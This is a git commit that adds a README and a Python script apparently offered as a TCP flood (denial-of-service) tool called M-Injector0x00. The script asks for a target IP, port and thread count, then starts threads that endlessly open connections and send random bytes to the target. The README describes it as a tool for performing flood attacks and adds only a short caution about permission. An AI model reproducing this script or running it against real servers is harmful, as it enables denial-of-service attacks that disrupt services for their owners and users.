5c374da260a789bddb431ccf9b43fe7203be1e02
mauritaniacoder99 <73405882+mauritaniacoder99@users.noreply.github.com>
2023-12-10 02:37:34 +0000

    mauri web
    Mauri web is a Python script designed to simulate a "flood" attack, specifically a TCP flood, on a specified server. The script utilizes multiple threads to establish concurrent connections and inundate the target server with traffic. The goal of this tool is to test the server's resilience to such flood attacks and analyze its performance under stress.

--- README.md
+++ README.md
@@ -1,2 +1,35 @@
-# mauritania-web
-Mauri web is a Python script designed to simulate a "flood" attack, specifically a TCP flood, on a specified server. The script utilizes multiple threads to establish concurrent connections and inundate the target server with traffic. The goal of this tool is to test the server's resilience to such flood attacks and analyze
+# M-Injector0x00 - Mauritania Coder
+
+![M-Injector0x00 Logo](mauricrack.png)
+
+## Description
+M-Injector0x00 is a Python script designed to perform "flood" attacks on specific servers using multiple threads.
+
+## Installation
+1. Make sure you have Python 3 installed on your computer.
+2. Install the required libraries using the following command:
+
+
+pip install colorama tqdm
+
+
+## Usage
+1. Run the script using Python 3:
+
+python3 mauritaniacracked.py
+
+2. Enter the attack information, such as the port number, IP address, and the number of threads.
+3. The attack will start automatically.
+
+## Notes
+- Use this tool with caution. Attacking systems or networks without permission may be illegal.
+- Ensure you have authorization to conduct security testing on the target systems.
+
+## Author
+- Mauritania Coder
+- GitHub: [github.com/mauritaniacoder](https://github.com/mauritaniacoder)
+
+## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+
---
+++ mauritaniacracked.py
@@ -0,0 +1,76 @@
+
+
+from colorama import Fore, init, Back, Style
+from tqdm import tqdm
+import socket, random, threading, datetime, time
+
+init()
+
+print(Fore.RED + """
+            . . .                         
+             \|/                          
+           --+--'                        
+             /|\                          
+            ' | '                         
+              |                           
+              |                           
+          ,--'#--.                       
+   \\\    ///        wWw  wWw  ))   wW  Ww(o)__(o)    \\\  ///wW  Ww          (O))  ((O)       _     
+ ((O)  (O))   /)   (O)  (O) (Oo)-.(O)(O)(__  __)/)  ((O)(O))(O)(O)  /)       ||    ||  wWw  /||_   
+  | \  / |  (o)(O) / )  ( \  | (_))(..)   (  )(o)(O) | \ ||  (..) (o)(O)     || /\ ||  (O)_  /`_)  
+  ||\\//||   //\\ / /    \ \ |  .'  ||     )(  //\\  ||\\||   ||   //\\      ||//\\|| .' __)|  `.  
+  || \/ ||  |(__)|| \____/ | )|\\  _||_   (  )|(__)| || \ |  _||_ |(__)|     / /  \ \(  _)  | (_)) 
+  ||    ||  /,-. |'. `--' .`(/  \)(_/\_)   )/ /,-. | ||  || (_/\_)/,-. |    ( /    \ )`.__) (.'-'  
+ (_/    \_)-'   ''  `-..-'   )            (  -'   ''(_/  \_)     -'   ''     )      (        )     
+ """)
+print()    
+
+print(Fore.LIGHTRED_EX,  " M-Injector0x00    MauriCRACK WEB ",  Fore.RESET, Back.LIGHTRED_EX, "Coding by: Mauritania Coder", Back.RESET)
+
+print()
+
+current_datetime = datetime.datetime.now()
+formatted_datetime = current_datetime.strftime("%d/%m/%Y ~ %H:%M:%S")
+
+print(Style.RESET_ALL)
+
+request_threads = Back.RESET + Fore.YELLOW+ " THREADS > " + Fore.RESET
+request_port = Back.RESET + Fore.YELLOW + " PORT > " + Fore.RESET
+request_ip = Fore.YELLOW+ " IP > " + Fore.RESET
+
+print(Back.RESET)
+
+target_port = int(input(request_port))
+target_ip = input(request_ip)
+num_threads = int(input(request_threads))
+
+def loading():
+   with tqdm(total=100, desc=Fore.GREEN + 'attacking...', ascii=False, ncols=75) as pbar:
+       for _ in range(100):
+           time.sleep(0.5)
+           pbar.update(1)
+           tqdm.write(Fore.GREEN + 'attacking...')
+
+def flood():
+   while True:
+       try:
+           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+           loading()
+           
+           s.connect((target_ip, target_port))
+           payload = random._urandom(1024)
+           
+           s.send(payload)
+           
+           s.close()
+       except:
+           pass
+
+
+for _ in range(num_threads):
+   t = threading.Thread(target=flood)
+   t.start()
+
+#created by Mauritaniainjector0x00 :: M-injector0x00
+# run python3 and name script 
+
